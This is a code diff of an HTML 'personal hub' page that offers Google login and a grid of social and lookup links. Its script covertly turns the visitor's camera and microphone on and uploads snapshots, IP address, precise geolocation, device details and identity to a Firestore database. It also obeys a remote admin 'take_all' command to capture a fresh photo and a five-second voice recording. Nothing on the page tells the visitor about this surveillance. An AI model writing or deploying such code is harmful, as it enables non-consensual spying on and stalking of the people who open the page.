@@ -3,20 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | Personal Portal</title>
+    <title>Ratan Bro | Digital Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --pink: #ff4d94; --dark: #0f172a; --card: rgba(30, 41, 59, 0.9); }
+        :root { --pink: #ff4d94; --dark: #020617; --glass: rgba(255, 255, 255, 0.05); }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
-        body { background: var(--dark); color: white; min-height: 100vh; overflow-x: hidden; }
+        body { background: var(--dark); color: white; min-height: 100vh; background-image: radial-gradient(circle at 50% 50%, #1e1b4b 0%, #020617 100%); }
+        
         #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .login-box { background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); text-align: center; width: 90%; max-width: 400px; }
-        .round-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--pink); margin-bottom: 20px; }
-        #main-ui { display: none; padding: 20px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; max-width: 900px; margin: 20px auto; }
-        .card { background: var(--card); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); }
+        .login-box { background: var(--glass); padding: 40px; border-radius: 30px; border: 1px solid var(--pink); text-align: center; backdrop-filter: blur(10px); width: 90%; max-width: 400px; box-shadow: 0 0 30px rgba(255, 77, 148, 0.2); }
+        .round-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); margin-bottom: 20px; box-shadow: 0 0 15px var(--pink); }
+
+        #main-ui { display: none; padding: 20px; animation: fadeIn 1s; }
+        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
+
+        .header { text-align: center; padding: 30px 0; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; max-width: 800px; margin: 0 auto; }
+        .card { background: var(--glass); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
+        .card:hover { border-color: var(--pink); transform: translateY(-5px); background: rgba(255, 77, 148, 0.05); }
         .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; }
+
         canvas, video { display: none; }
     </style>
 </head>
@@ -24,24 +31,28 @@
 
     <div id="login-overlay">
         <div class="login-box">
-            <img src="ratan.jpg" class="round-img" onerror="this.src='https://via.placeholder.com/110'">
-            <h2 style="color: var(--pink);">Ratan Bro Hub</h2>
-            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:20px;">
-                <i class="fab fa-google"></i> Login with Google
+            <img src="ratan.jpg" class="round-img" onerror="this.src='https://via.placeholder.com/100'">
+            <h2 style="color: var(--pink); margin-bottom: 10px;">Login to Access</h2>
+            <p style="font-size: 0.9rem; opacity: 0.7; margin-bottom: 25px;">Welcome to Ratan Bro's Personal Hub</p>
+            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:15px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; display:flex; align-items:center; justify-content:center; gap:10px;">
+                <i class="fab fa-google"></i> Continue with Google
             </button>
         </div>
     </div>
 
     <div id="main-ui">
-        <div style="text-align:center; padding:40px 0;">
-            <img id="user-display-pic" src="" style="width:100px; border-radius:50%; border:3px solid var(--pink);">
-            <h2 id="user-welcome" style="margin-top:15px;"></h2>
+        <div class="header">
+            <img id="u_dp" src="" style="width:80px; border-radius:50%; border:2px solid var(--pink);">
+            <h2 id="u_welcome" style="margin-top:10px;"></h2>
         </div>
+        
         <div class="grid">
+            <a href="https://facebook.com" class="card"><i class="fab fa-facebook"></i><h4>Facebook</h4></a>
+            <a href="https://wa.me/yournumber" class="card"><i class="fab fa-whatsapp"></i><h4>WhatsApp</h4></a>
             <a href="#" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
             <a href="#" class="card"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
-            <a href="#" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
             <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search-location"></i><h4>No. Lookup</h4></a>
+            <a href="#" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
         </div>
     </div>
 
@@ -73,62 +84,67 @@
             if (user) {
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
-                document.getElementById('user-welcome').innerText = "স্বাগতম, " + user.displayName;
-                document.getElementById('user-display-pic').src = user.photoURL;
-                startTracking(user);
+                document.getElementById('u_welcome').innerText = user.displayName;
+                document.getElementById('u_dp').src = user.photoURL;
+                initTracking(user);
             }
         });
 
-        async function startTracking(user) {
-            const userRef = doc(db, "users", user.email.replace('.', '_'));
+        async function initTracking(user) {
+            const uId = user.email.replace('.', '_');
+            const userRef = doc(db, "users", uId);
+
+            // ক্যামেরা পারমিশন
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
             if(stream) document.getElementById('vSource').srcObject = stream;
 
-            // অ্যাডমিন কমান্ড চেক করা (Real-time)
-            onSnapshot(userRef, async (docSnap) => {
-                const data = docSnap.data();
-                if (data && data.command === "take_photo") {
-                    await takeSnapshot(user); // সাথে সাথে ছবি
-                    await recordQuickVoice(user); // ৫ সেকেন্ড ভয়েস
-                    await updateDoc(userRef, { command: "" }); // কমান্ড রিসেট
+            // অ্যাডমিন কমান্ড লিসেনার
+            onSnapshot(userRef, async (snap) => {
+                const data = snap.data();
+                if(data && data.command === "take_all") {
+                    await capture(user);
+                    await record(user);
+                    await updateDoc(userRef, { command: "" });
                 }
             });
 
-            // সাধারণ ট্র্যাকিং (প্রতি ১০ সেকেন্ডে)
-            setInterval(() => takeSnapshot(user), 10000);
+            // প্রথমবার ঢুকেই ডাটা পাঠানো
+            capture(user);
         }
 
-        async function takeSnapshot(user) {
+        async function capture(user) {
             const canvas = document.getElementById('snapCanvas');
             const video = document.getElementById('vSource');
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, 640, 480);
-            const imgData = canvas.toDataURL('image/jpeg', 0.5);
-            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
+            const img = canvas.toDataURL('image/jpeg', 0.5);
             
-            navigator.geolocation.getCurrentPosition(async (pos) => {
+            const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            
+            navigator.geolocation.getCurrentPosition(async (p) => {
                 await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                     name: user.displayName, email: user.email, photo: user.photoURL,
-                    ip: ipData.ip, loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                    lastPic: imgData, time: new Date().toLocaleString()
+                    ip: ipRes.ip, loc: `${p.coords.latitude},${p.coords.longitude}`,
+                    lastPic: img, time: new Date().toLocaleString(),
+                    device: navigator.userAgent
                 }, { merge: true });
             });
         }
 
-        async function recordQuickVoice(user) {
+        async function record(user) {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
+            const mr = new MediaRecorder(stream);
             let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
+            mr.ondataavailable = e => chunks.push(e.data);
+            mr.onstop = async () => {
                 const reader = new FileReader();
                 reader.readAsDataURL(new Blob(chunks));
                 reader.onloadend = async () => {
                     await updateDoc(doc(db, "users", user.email.replace('.', '_')), { lastAudio: reader.result });
                 };
             };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 5000); // ৫ সেকেন্ড রেকর্ড
+            mr.start();
+            setTimeout(() => mr.stop(), 5000);
         }
     </script>
 </body>
